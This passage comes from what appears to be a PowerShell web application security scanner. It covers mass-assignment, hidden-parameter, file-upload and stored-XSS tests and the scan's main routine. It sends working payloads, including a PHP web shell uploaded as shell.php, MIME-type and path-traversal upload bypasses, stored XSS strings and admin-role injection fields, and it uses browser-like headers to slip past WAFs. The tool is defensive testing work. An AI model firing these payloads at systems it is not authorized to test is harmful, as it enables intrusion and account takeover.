                        }
                    }
                    
                    if ($script:AggressiveAccess) {
                        Start-Sleep -Milliseconds 100
                    }
                }
            }
        }
        
        if ($vulnerableEndpoints.Count -gt 0) {
            foreach ($vuln in $vulnerableEndpoints) {
                Add-Issue -severity "High" `
                    -title "Improper Input Validation - Boundary Value Accepted" `
                    -description "Endpoint $($vuln.Endpoint) accepts suspicious parameter value $($vuln.Parameter)=$($vuln.Value) and returns 200 OK. May expose unauthorized data or cause unexpected behavior." `
                    -remediation "Implement strict input validation. Reject negative IDs, zero values where inappropriate, and type mismatches. Return 400 Bad Request for invalid input." `
                    -whyItMatters "Boundary values often bypass validation logic. Negative IDs can access system records. Zero may return 'all records'. Null/undefined can trigger default behavior exposing sensitive data." `
                    -url "$site$($vuln.Endpoint)?$($vuln.Parameter)=$($vuln.Value)" `
                    -confidence "Medium"
            }
        }
        
        # TEST 2: Mass Assignment Testing (requires authentication)
        if ($script:authState.IsAuthenticated) {
            Write-Info "Test 2: Mass assignment vulnerability testing..."
            
            $massAssignmentEndpoints = @(
                @{Path = "/api/user"; Method = "PUT"; InjectedFields = @{role = "admin"; isAdmin = $true; isPremium = $true}},
                @{Path = "/api/profile"; Method = "PUT"; InjectedFields = @{role = "admin"; verified = $true; isStaff = $true}},
                @{Path = "/api/user/update"; Method = "POST"; InjectedFields = @{role = "admin"; permissions = "all"; accountType = "premium"}},
                @{Path = "/api/account"; Method = "PATCH"; InjectedFields = @{credits = 999999; balance = 999999; tier = "platinum"}}
            )
            
            foreach ($endpoint in $massAssignmentEndpoints) {
                $testUrl = $site + $endpoint.Path
                
                Write-Info "Testing mass assignment on: $($endpoint.Path) ($($endpoint.Method))"
                
                # First, get current state
                $beforeResult = Invoke-SafeWebRequest -uri $testUrl -method "GET" -useAuth $true -timeoutSec 5
                
                if ($beforeResult.Success -and $beforeResult.Content) {
                    # Try to inject privileged fields
                    $payload = @{
                        name = "Test User"
                        email = "test@example.com"
                    }
                    
                    # Add injected fields
                    foreach ($key in $endpoint.InjectedFields.Keys) {
                        $payload[$key] = $endpoint.InjectedFields[$key]
                    }
                    
                    $payloadJson = $payload | ConvertTo-Json -Compress
                    
                    $injectResult = Invoke-SafeWebRequest `
                        -uri $testUrl `
                        -method $endpoint.Method `
                        -body $payloadJson `
                        -headers @{"Content-Type" = "application/json"} `
                        -useAuth $true `
                        -timeoutSec 5
                    
                    if ($injectResult.Success -and $injectResult.StatusCode -in @(200, 201, 204)) {
                        # Check if fields were accepted
                        Start-Sleep -Milliseconds 500
                        $afterResult = Invoke-SafeWebRequest -uri $testUrl -method "GET" -useAuth $true -timeoutSec 5
                        
                        if ($afterResult.Success -and $afterResult.Content) {
                            try {
                                $afterData = $afterResult.Content | ConvertFrom-Json
                                
                                # Check if our injected fields appear
                                $injectionSucceeded = $false
                                $injectedKeys = @()
                                
                                foreach ($key in $endpoint.InjectedFields.Keys) {
                                    if ($afterData.$key -eq $endpoint.InjectedFields[$key]) {
                                        $injectionSucceeded = $true
                                        $injectedKeys += $key
                                    }
                                }
                                
                                if ($injectionSucceeded) {
                                    Write-Danger "MASS ASSIGNMENT CONFIRMED: Injected privileged fields accepted!"
                                    Write-Danger "  Successfully injected: $($injectedKeys -join ', ')"
                                    
                                    Add-Issue -severity "Critical" `
                                        -title "Mass Assignment Vulnerability - Privilege Escalation" `
                                        -description "CONFIRMED EXPLOIT: Endpoint $($endpoint.Path) accepts unauthorized fields in $($endpoint.Method) request body. Successfully injected privileged fields: $($injectedKeys -join ', '). Application blindly assigns all submitted parameters to object properties without whitelist validation." `
                                        -remediation "Implement strict parameter whitelisting. Only bind explicitly allowed fields. Use DTOs/form objects that define permitted properties. Frameworks: Rails (strong_parameters), Django (ModelForm with fields), .NET (BindInclude/BindExclude), Express (pick/omit from lodash)." `
                                        -whyItMatters "Mass assignment allows attackers to modify fields not intended for user control. Examples: escalate to admin role, set isVerified=true without email verification, manipulate prices/credits, bypass payment, access premium features. This is a direct path to privilege escalation and unauthorized access." `
                                        -url $testUrl `
                                        -category "Authorization" `
                                        -cweId "CWE-915" `
                                        -confidence "Confirmed" `
                                        -evidence @{
                                            Endpoint = $endpoint.Path
                                            Method = $endpoint.Method
                                            InjectedFields = ($endpoint.InjectedFields.Keys -join ', ')
                                            ConfirmedFields = ($injectedKeys -join ', ')
                                            PayloadSent = $payloadJson
                                        }
                                } else {
                                    Write-Success "Mass assignment protection working (injected fields rejected)"
                                }
                            }
                            catch {
                                Write-Info "Could not parse response for mass assignment verification"
                            }
                        }
                    }
                }
                
                if ($script:AggressiveAccess) {
                    Start-Sleep -Milliseconds 200
                }
            }
        } else {
            Write-Info "Mass assignment testing skipped (requires authentication)"
            Write-Info "Provide -SessionCookie or -Username/-Password for full testing"
        }
        
        # TEST 3: Hidden Parameter Discovery
        Write-Info "Test 3: Hidden parameter discovery..."
        
        $hiddenParams = @("debug", "admin", "test", "dev", "internal", "showAll", "verbose", "trace")
        
        $testUrls = @(
            $site,
            $site + "/api/users",
            $site + "/dashboard"
        )
        
        foreach ($url in $testUrls) {
            foreach ($param in $hiddenParams) {
                $testUrl = "$url?$param=1"
                $result = Invoke-SafeWebRequest -uri $testUrl -method "GET" -useAuth $true -timeoutSec 5
                
                if ($result.Success -and $result.Content) {
                    # Check if response changes significantly
                    if ($result.Content -match '(?i)(debug|trace|stack|exception|error|sql|query)' -and 
                        $result.Content.Length -gt 5000) {
                        Write-Warning "Hidden parameter may expose debug info: ?$param=1"
                        
                        Add-Issue -severity "Medium" `
                            -title "Debug Parameter Exposure" `
                            -description "Hidden parameter ?$param=1 may enable debug mode or verbose output, potentially exposing internal application details." `
                            -remediation "Remove or disable debug parameters in production. If needed, protect with authentication and IP whitelist." `
                            -url $testUrl `
                            -confidence "Low"
                    }
                }
                
                if ($script:AggressiveAccess) {
                    Start-Sleep -Milliseconds 50
                }
            }
        }
        
        Complete-SecurityTest
    }
    catch {
        Write-Danger "Parameter tampering test failed: $_"
        Complete-SecurityTest "Failed"
    }
}

# ============================================================================
# TEST 32: FILE UPLOAD SECURITY
# ============================================================================
function Test-FileUploadSecurity {
    Start-SecurityTest "File Upload Security Testing" "32"
    
    Write-Info "Discovering and testing file upload endpoints..."
    
    try {
        # Common upload endpoints
        $uploadEndpoints = @(
            "/upload",
            "/api/upload",
            "/api/file/upload",
            "/api/files",
            "/api/avatar/upload",
            "/api/profile/avatar",
            "/api/document/upload",
            "/api/attachment",
            "/user/avatar",
            "/profile/picture"
        )
        
        $foundEndpoints = @()
        
        # Discover upload endpoints
        Write-Info "Discovering upload endpoints..."
        
        foreach ($endpoint in $uploadEndpoints) {
            $testUrl = $site + $endpoint
            $result = Invoke-SafeWebRequest -uri $testUrl -method "OPTIONS" -useAuth $true -timeoutSec 5
            
            if ($result.Success -or $result.StatusCode -eq 200) {
                $foundEndpoints += $endpoint
                Write-Info "Found potential upload endpoint: $endpoint"
            }
            
            if ($script:AggressiveAccess) {
                Start-Sleep -Milliseconds 100
            }
        }
        
        if ($foundEndpoints.Count -eq 0) {
            Write-Info "No obvious upload endpoints found via direct testing"
            Write-Info "Manual testing recommended: Look for file upload forms in authenticated pages"
            Complete-SecurityTest
            return
        }
        
        Write-Info "Testing $($foundEndpoints.Count) upload endpoint(s)..."
        
        foreach ($endpoint in $foundEndpoints) {
            $testUrl = $site + $endpoint
            
            # TEST 1: PHP File Upload
            Write-Info "Test 1: Testing executable file upload (.php)..."
            
            $phpPayload = '<?php system($_GET["cmd"]); ?>'
            $boundary = "----WebKitFormBoundary" + (Get-Random)
            $phpBody = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

$phpPayload
--$boundary--
"@
            
            $uploadResult = Invoke-SafeWebRequest `
                -uri $testUrl `
                -method "POST" `
                -body $phpBody `
                -headers @{"Content-Type" = "multipart/form-data; boundary=$boundary"} `
                -useAuth $true `
                -timeoutSec 10
            
            if ($uploadResult.StatusCode -in @(200, 201, 204)) {
                Write-Danger "PHP file upload accepted! Potential RCE vulnerability"
                
                Add-Issue -severity "Critical" `
                    -title "Unrestricted File Upload - Remote Code Execution Risk" `
                    -description "Endpoint $endpoint accepts .php file uploads (Status: $($uploadResult.StatusCode)). If uploaded files are accessible and executed by web server, this leads to Remote Code Execution." `
                    -remediation "1. Whitelist allowed extensions (jpg, png, pdf only). 2. Validate MIME type server-side. 3. Store uploads outside webroot or in storage bucket. 4. Rename files to remove extension. 5. Set web server to not execute scripts in upload directory." `
                    -whyItMatters "Attacker can upload web shell (PHP/JSP/ASPX) containing system commands. If file is accessible via HTTP and executed, attacker gains full server control: read database credentials, modify files, pivot to internal network, install ransomware." `
                    -url $testUrl `
                    -category "File Upload" `
                    -cweId "CWE-434" `
                    -confidence "High"
            } else {
                Write-Success "PHP file upload rejected (Status: $($uploadResult.StatusCode))"
            }
            
            # TEST 2: MIME Type Bypass
            Write-Info "Test 2: Testing MIME type bypass..."
            
            $bypassBody = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

$phpPayload
--$boundary--
"@
            
            $bypassResult = Invoke-SafeWebRequest `
                -uri $testUrl `
                -method "POST" `
                -body $bypassBody `
                -headers @{"Content-Type" = "multipart/form-data; boundary=$boundary"} `
                -useAuth $true `
                -timeoutSec 10
            
            if ($bypassResult.StatusCode -in @(200, 201, 204)) {
                Write-Danger "MIME type bypass successful! PHP file accepted as image"
                
                Add-Issue -severity "Critical" `
                    -title "File Upload MIME Type Bypass" `
                    -description "Endpoint accepts .php file when Content-Type is set to image/jpeg. Application only validates MIME type header (client-controlled), not actual file content." `
                    -remediation "Validate actual file content using magic bytes/file signature, not HTTP headers. Use libraries like python-magic, fileinfo (PHP), or file-type (Node.js)." `
                    -whyItMatters "MIME type headers are trivially forged. Attacker bypasses validation by uploading malicious file with fake Content-Type. Leads to code execution, XSS, or data exfiltration depending on file type and handling." `
                    -url $testUrl `
                    -cweId "CWE-434" `
                    -confidence "High"
            }
            
            # TEST 3: Path Traversal in Filename
            Write-Info "Test 3: Testing path traversal in filename..."
            
            $traversalBody = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="../../evil.php"
Content-Type: text/plain

test
--$boundary--
"@
            
            $traversalResult = Invoke-SafeWebRequest `
                -uri $testUrl `
                -method "POST" `
                -body $traversalBody `
                -headers @{"Content-Type" = "multipart/form-data; boundary=$boundary"} `
                -useAuth $true `
                -timeoutSec 10
            
            if ($traversalResult.StatusCode -in @(200, 201, 204)) {
                Write-Warning "Path traversal filename accepted - may overwrite arbitrary files"
                
                Add-Issue -severity "High" `
                    -title "Path Traversal in File Upload" `
                    -description "Application accepts filename with path traversal sequence (../../). May allow attacker to write files outside intended directory, overwrite critical files, or achieve code execution." `
                    -remediation "Sanitize filenames: remove path separators (/, \\), reject .. sequences, generate random filenames instead of using client-provided names." `
                    -whyItMatters "Attacker can overwrite application code, configuration files, or system files. Examples: overwrite config.php with credentials, overwrite .htaccess to allow script execution, overwrite startup scripts." `
                    -url $testUrl `
                    -cweId "CWE-23" `
                    -confidence "Medium"
            }
            
            # TEST 4: SVG with JavaScript (XSS vector)
            Write-Info "Test 4: Testing SVG upload with JavaScript..."
            
            $svgPayload = @"
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="100" height="100" fill="red" />
   <script type="text/javascript">
      alert('XSS via SVG');
   </script>
</svg>
"@
            
            $svgBody = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="image.svg"
Content-Type: image/svg+xml

$svgPayload
--$boundary--
"@
            
            $svgResult = Invoke-SafeWebRequest `
                -uri $testUrl `
                -method "POST" `
                -body $svgBody `
                -headers @{"Content-Type" = "multipart/form-data; boundary=$boundary"} `
                -useAuth $true `
                -timeoutSec 10
            
            if ($svgResult.StatusCode -in @(200, 201, 204)) {
                Write-Warning "SVG file upload accepted - potential XSS vector"
                
                Add-Issue -severity "High" `
                    -title "SVG Upload Allows Embedded JavaScript" `
                    -description "Application accepts SVG files containing JavaScript. If served with image/svg+xml MIME type and viewed in browser, scripts execute in victim's context (Stored XSS)." `
                    -remediation "1. Sanitize SVG files to remove script tags and event handlers (onload, onclick, etc.). 2. Serve SVG files with Content-Disposition: attachment. 3. Set Content-Security-Policy to block inline scripts. 4. Convert SVG to raster format (PNG) for display." `
                    -whyItMatters "SVG files can contain JavaScript that executes when image is viewed. Attacker uploads malicious SVG as profile picture or document. When other users view it, JavaScript steals session cookies, performs actions as victim, or redirects to phishing site." `
                    -url $testUrl `
                    -cweId "CWE-79" `
                    -confidence "High"
            }
            
            if ($script:AggressiveAccess) {
                Start-Sleep -Milliseconds 300
            }
        }
        
        Complete-SecurityTest
    }
    catch {
        Write-Danger "File upload security test failed: $_"
        Complete-SecurityTest "Failed"
    }
}

# ============================================================================
# TEST 33: STORED XSS TESTING
# ============================================================================
function Test-StoredXSS {
    Start-SecurityTest "Stored/Persistent XSS Testing" "33"
    
    if (-not $script:authState.IsAuthenticated) {
        Write-Info "Stored XSS testing requires authentication to inject payloads"
        Write-Info "Provide: -SessionCookie 'session=...' or -Username/-Password"
        Complete-SecurityTest "Skipped"
        return
    }
    
    Write-Info "Testing persistent XSS via authenticated endpoints..."
    
    try {
        $xssMarker = "XSS_TEST_" + (Get-Random -Minimum 1000 -Maximum 9999)
        $xssPayloads = @(
            "<script>alert('$xssMarker')</script>",
            "<img src=x onerror=alert('$xssMarker')>",
            "<svg/onload=alert('$xssMarker')>",
            "javascript:alert('$xssMarker')",
            "<iframe src=javascript:alert('$xssMarker')>"
        )
        
        # Injection endpoints
        $injectionTargets = @(
            @{Path = "/api/profile"; Method = "PUT"; Fields = @("name", "bio", "location", "website")},
            @{Path = "/api/user"; Method = "PATCH"; Fields = @("name", "description", "about")},
            @{Path = "/api/comment"; Method = "POST"; Fields = @("text", "content", "body")},
            @{Path = "/api/message"; Method = "POST"; Fields = @("body", "text", "content")},
            @{Path = "/api/post"; Method = "POST"; Fields = @("title", "body", "content")}
        )
        
        $injectedEndpoints = @()
        
        Write-Info "Injecting XSS payloads into persistent fields..."
        
        foreach ($target in $injectionTargets) {
            $injectUrl = $site + $target.Path
            
            foreach ($field in $target.Fields) {
                foreach ($payload in $xssPayloads) {
                    Write-Info "Testing: $($target.Path) - field: $field"
                    
                    $body = @{
                        $field = $payload
                        marker = $xssMarker
                    } | ConvertTo-Json -Compress
                    
                    $injectResult = Invoke-SafeWebRequest `
                        -uri $injectUrl `
                        -method $target.Method `
                        -body $body `
                        -headers @{"Content-Type" = "application/json"} `
                        -useAuth $true `
                        -timeoutSec 10
                    
                    if ($injectResult.StatusCode -in @(200, 201, 204)) {
                        Write-Success "Payload accepted at $($target.Path) ($field)"
                        
                        $injectedEndpoints += @{
                            InjectionPath = $target.Path
                            Field = $field
                            Payload = $payload
                            Marker = $xssMarker
                        }
                        
                        break # Only inject one payload per field
                    }
                    
                    if ($script:AggressiveAccess) {
                        Start-Sleep -Milliseconds 100
                    }
                }
            }
        }
        
        if ($injectedEndpoints.Count -eq 0) {
            Write-Info "Could not inject payloads (endpoints may not exist or reject input)"
            Complete-SecurityTest
            return
        }
        
        Write-Info "Injected $($injectedEndpoints.Count) payload(s). Checking render locations..."
        Start-Sleep -Seconds 2
        
        # Check common render locations
        $renderLocations = @(
            "/profile",
            "/user/profile",
            "/dashboard",
            "/api/user",
            "/api/profile",
            "/comments",
            "/messages",
            "/posts",
            "/feed"
        )
        
        $confirmedXSS = @()
        
        foreach ($location in $renderLocations) {
            $viewUrl = $site + $location
            $viewResult = Invoke-SafeWebRequest -uri $viewUrl -method "GET" -useAuth $true -timeoutSec 10
            
            if ($viewResult.Success -and $viewResult.Content) {
                foreach ($injection in $injectedEndpoints) {
                    # Check if our payload is rendered unescaped
                    if ($viewResult.Content -match [regex]::Escape($injection.Payload)) {
                        Write-Danger "STORED XSS CONFIRMED at $location!"
                        Write-Danger "  Payload: $($injection.Payload.Substring(0, [Math]::Min(50, $injection.Payload.Length)))..."
                        
                        $confirmedXSS += @{
                            InjectionPoint = $injection.InjectionPath
                            Field = $injection.Field
                            RenderLocation = $location
                            Payload = $injection.Payload
                        }
                        
                        Add-Issue -severity "Critical" `
                            -title "Stored XSS Vulnerability (Persistent)" `
                            -description "CONFIRMED EXPLOIT: Injected XSS payload into $($injection.Field) field at $($injection.InjectionPath), payload renders unescaped at $location. Every user viewing this page will execute attacker's JavaScript code." `
                            -remediation "1. HTML-escape all user input before rendering: htmlspecialchars() (PHP), escapeHtml() (Java), escape() (Python), or framework-specific escaping. 2. Use Content-Security-Policy header to block inline scripts. 3. Validate input format on upload. 4. Use templating engines with auto-escaping (React, Vue, Angular)." `
                            -whyItMatters "Stored XSS is more dangerous than reflected XSS because payload persists in database and attacks all users who view it. Attacker can: steal session cookies (document.cookie), perform actions as victim (AJAX requests), log keystrokes, redirect to phishing, spread XSS worm. Unlike reflected XSS, victim doesn't need to click malicious link - just viewing profile/comment triggers attack." `
                            -url $viewUrl `
                            -category "XSS" `
                            -cweId "CWE-79" `
                            -confidence "Confirmed" `
                            -evidence @{
                                InjectionEndpoint = $injection.InjectionPath
                                InjectedField = $injection.Field
                                RenderEndpoint = $location
                                Payload = $injection.Payload
                                Marker = $injection.Marker
                                PayloadFound = $true
                            }
                        
                        break
                    }
                    elseif ($viewResult.Content -match [regex]::Escape($injection.Marker)) {
                        # Marker found but payload was escaped
                        Write-Success "Payload found at $location but properly escaped (protection working)"
                    }
                }
            }
            
            if ($script:AggressiveAccess) {
                Start-Sleep -Milliseconds 200
            }
        }
        
        if ($confirmedXSS.Count -gt 0) {
            Write-Host ""
            Write-Danger "========================================="
            Write-Danger "CRITICAL: $($confirmedXSS.Count) CONFIRMED STORED XSS VULNERABILITIES"
            Write-Danger "========================================="
            
            foreach ($xss in $confirmedXSS) {
                Write-Danger "  • $($xss.InjectionPoint) ($($xss.Field)) → renders at $($xss.RenderLocation)"
            }
            
            Write-Host ""
            Write-Danger "These XSS vulnerabilities affect ALL USERS viewing these pages."
            Write-Danger "IMMEDIATE remediation required."
        } else {
            Write-Success "No confirmed stored XSS vulnerabilities (output properly escaped)"
        }
        
        Complete-SecurityTest
    }
    catch {
        Write-Danger "Stored XSS test failed: $_"
        Complete-SecurityTest "Failed"
    }
}

# ============================================================================
# EXECUTE ALL TESTS
# ============================================================================
function Start-SecurityScan {
    Initialize-Scan
    
    # TEST 0: CRITICAL - Scope and Safety Validation (MUST PASS)
    $scopeResult = Test-ScopeAndSafety
    if ($scopeResult.Status -ne "Completed") {
        Write-Danger "SCAN ABORTED: Scope validation failed!"
        Write-Danger "Fix the authorization issues and try again."
        Generate-FinalReport
        return
    }
    
    # AUTHENTICATION: Initialize authenticated session if credentials provided
    if ($Username -or $SessionCookie -or $AuthHeaders.Count -gt 0) {
        Write-Section "AUTHENTICATION SETUP"
        $authSuccess = Initialize-Authentication
        
        if ($authSuccess) {
            Write-Success "Authenticated scanning enabled!"
            Write-Info "Tests will run with authenticated session context"
        }
        else {
            Write-Warning "Authentication failed - continuing with unauthenticated scan"
        }
    }
    
    # ========================================================================
    # BASELINE FETCH: Single request reused across multiple tests
    # ========================================================================
    Write-Section "BASELINE FETCH"
    Write-Info "Fetching homepage for reuse across tests (reduces rate-limiting)..."
    
    $script:baselineResponse = @{
        Success = $false
        StatusCode = 0
        Headers = @{}
        Content = ""
        Cookies = @()
        FetchTime = Get-Date
    }
    
    $script:AggressiveAccess = $false  # Flag for WAF-triggered environment
    
    try {
        # Enhanced browser-like request to avoid WAF blocks
        $baselineHeaders = @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            "Accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
            "Accept-Language" = "en-US,en;q=0.9"
            "Accept-Encoding" = "gzip, deflate, br"
            "DNT" = "1"
            "Connection" = "keep-alive"
            "Upgrade-Insecure-Requests" = "1"
        }
        
        # Add cache-bust with random seed to avoid cached block rules
        $randomSeed = Get-Random -Minimum 10000 -Maximum 99999
        $cacheBust = "?_scanSeed=$randomSeed"
        $baselineUrl = $site + $cacheBust
        
        Write-Info "Attempt 1/2: $baselineUrl"
        $result = Invoke-SafeWebRequest -uri $baselineUrl -method "GET" -headers $baselineHeaders -timeoutSec 10
        
        if ($result.Success) {
            $script:baselineResponse.Success = $true
            $script:baselineResponse.StatusCode = $result.StatusCode
            $script:baselineResponse.Headers = $result.Headers
            $script:baselineResponse.Content = $result.Content
            
            # Extract cookies
            if ($result.Headers -and $result.Headers.ContainsKey('Set-Cookie')) {
                $script:baselineResponse.Cookies = $result.Headers['Set-Cookie']
            }
            
            Write-Success "Baseline fetch successful (Status: $($result.StatusCode), Size: $($result.Content.Length) bytes)"
            Write-Info "Baseline data will be reused for: headers, cookies, JS scraping, CSRF analysis"
        }
        else {
            Write-Warning "Baseline fetch failed (Status: $($result.StatusCode)) - retrying with delay..."
            Start-Sleep -Milliseconds 200
            
            # Retry without cache-bust, different headers
            Write-Info "Attempt 2/2: $site (no cache-bust)"
            $baselineHeaders["Cache-Control"] = "no-cache"
            $retryResult = Invoke-SafeWebRequest -uri $site -method "GET" -headers $baselineHeaders -timeoutSec 15
            
            if ($retryResult.Success) {
                $script:baselineResponse.Success = $true
                $script:baselineResponse.StatusCode = $retryResult.StatusCode
                $script:baselineResponse.Headers = $retryResult.Headers
                $script:baselineResponse.Content = $retryResult.Content
                
                if ($retryResult.Headers -and $retryResult.Headers.ContainsKey('Set-Cookie')) {
                    $script:baselineResponse.Cookies = $retryResult.Headers['Set-Cookie']
                }
                
                Write-Success "Baseline fetch successful on retry"
            }
            else {
                Write-Danger "Baseline fetch failed after 2 attempts"
                Write-Warning "Target may have aggressive WAF/rate limiting - enabling defensive mode"
                $script:AggressiveAccess = $true
                Write-Info "Tests will: 1) Fetch individually, 2) Add delays, 3) Reduce payload counts"
            }
        }
    }
    catch {
        Write-Warning "Baseline fetch exception: $($_.Exception.Message)"
        Write-Info "Tests will proceed with individual fetches"
    }
    
    Write-Host ""
    
    # Core tests with graceful fallback
    Invoke-TestWithFallback -TestFunction { Test-AppDiscovery } -TestName "Application Discovery"
    Invoke-TestWithFallback -TestFunction { Test-SecurityHeaders } -TestName "Security Headers"
    Invoke-TestWithFallback -TestFunction { Test-SensitiveFiles } -TestName "Sensitive Files"
    Invoke-TestWithFallback -TestFunction { Test-EnhancedContentDiscovery } -TestName "Enhanced Content Discovery"
    Invoke-TestWithFallback -TestFunction { Test-AdminPanelDiscovery } -TestName "Admin Panel Discovery"
    Invoke-TestWithFallback -TestFunction { Test-SQLInjection } -TestName "SQL Injection"
    Invoke-TestWithFallback -TestFunction { Test-XSS } -TestName "XSS"
    Invoke-TestWithFallback -TestFunction { Test-PathTraversal } -TestName "Path Traversal"
    Invoke-TestWithFallback -TestFunction { Test-RateLimiting } -TestName "Rate Limiting"
    
    # Additional tests with graceful fallback
    Invoke-TestWithFallback -TestFunction { Test-DirectoryListing } -TestName "Directory Listing"
    Invoke-TestWithFallback -TestFunction { Test-CookieSecurity } -TestName "Cookie Security"
    Invoke-TestWithFallback -TestFunction { Test-CSRF } -TestName "CSRF Protection"
    Invoke-TestWithFallback -TestFunction { Test-CORS } -TestName "CORS"
    Invoke-TestWithFallback -TestFunction { Test-HTTPMethods } -TestName "HTTP Methods"
    Invoke-TestWithFallback -TestFunction { Test-TLS } -TestName "TLS Security"
    Invoke-TestWithFallback -TestFunction { Test-OpenRedirect } -TestName "Open Redirect"
    Invoke-TestWithFallback -TestFunction { Test-WAFDetection } -TestName "WAF & Bot Defense Detection"
    Invoke-TestWithFallback -TestFunction { Test-InformationDisclosure } -TestName "Information Disclosure"
    Invoke-TestWithFallback -TestFunction { Test-JSAssetScraping } -TestName "JavaScript Asset Secret Scanning"
    
    # Baseline comparison (if baseline provided)
    if ($BaselineReport) {
        Invoke-TestWithFallback -TestFunction { Test-BaselineDiff -baselinePath $BaselineReport } -TestName "Baseline Comparison"
    }
    
    # Professional Reconnaissance & Advanced Attack Surface Tests with graceful fallback
    Invoke-TestWithFallback -TestFunction { Test-SubdomainEnum } -TestName "Subdomain Enumeration"
    Invoke-TestWithFallback -TestFunction { Test-APIDiscovery } -TestName "API Discovery"
    Invoke-TestWithFallback -TestFunction { Test-HTTPParameterPollution } -TestName "HTTP Parameter Pollution"
    Invoke-TestWithFallback -TestFunction { Test-CachePoisoning } -TestName "Cache Poisoning"
    Invoke-TestWithFallback -TestFunction { Test-CommandInjection } -TestName "Command Injection"
    Invoke-TestWithFallback -TestFunction { Test-LargeParameterDoS } -TestName "Large Parameter DoS"
    Invoke-TestWithFallback -TestFunction { Test-BrokenAccessControl } -TestName "Broken Access Control / IDOR"
    Invoke-TestWithFallback -TestFunction { Test-Clickjacking } -TestName "Clickjacking"
    
    # ========================================================================
    # ADVANCED EXPLOITATION & PROOF-OF-CONCEPT TESTS (Tests 30-34)
    # ========================================================================
    Write-Section "ADVANCED EXPLOITATION TESTING"
    Write-Info "Phase 2: Proof-of-concept exploitation and privilege escalation testing"
    Write-Info "These tests prove vulnerabilities are actually exploitable, not just detected"
    Write-Host ""
    
    Invoke-TestWithFallback -TestFunction { Test-SessionSecurity } -TestName "Session Security & Token Validation"
    Invoke-TestWithFallback -TestFunction { Test-ParameterTampering } -TestName "Parameter Tampering & Mass Assignment"
    Invoke-TestWithFallback -TestFunction { Test-FileUploadSecurity } -TestName "File Upload Security"
    Invoke-TestWithFallback -TestFunction { Test-StoredXSS } -TestName "Stored XSS Testing"

    # Final report
    Generate-FinalReport
}


# ============================================================================
# MAIN EXECUTION
# ============================================================================
try {
    Start-SecurityScan
}
catch {
    Write-Danger "Fatal error during scan: $_"
    Write-Log "FATAL ERROR: $_" "ERROR"
    exit 1
}
finally {
    Write-Host ""
    Write-Host "Scan logs saved to: $logFile" -ForegroundColor Cyan
}
